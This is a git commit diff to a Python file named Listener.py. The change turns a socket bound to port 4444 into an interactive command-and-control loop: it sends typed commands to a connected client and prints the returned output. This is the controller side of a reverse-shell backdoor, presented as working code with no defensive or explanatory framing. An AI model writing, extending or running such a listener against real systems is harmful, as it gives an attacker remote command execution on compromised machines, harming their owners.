0c1b585760ca5f6acfabc74391e8aa2ee5114f0b
Raghav-45 <77260113+Raghav-45@users.noreply.github.com>
2022-08-26 23:12:01 +0530

    Update Listener.py

--- Listener.py
+++ Listener.py
@@ -5,5 +5,11 @@ listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 listener.bind(('10.38.1.110', 4444))
 listener.listen(0)
 print('[+] Waiting for incoming connections.')
-listener.accept()
-print('[+] Got a connection.')
+connection, address = listener.accept()
+print('[+] Got a connection from ' + str(address))
+
+while True:
+    command = input('>> ').encode()
+    connection.send(command)
+    result = connection.recv(1024).decode()
+    print(result)
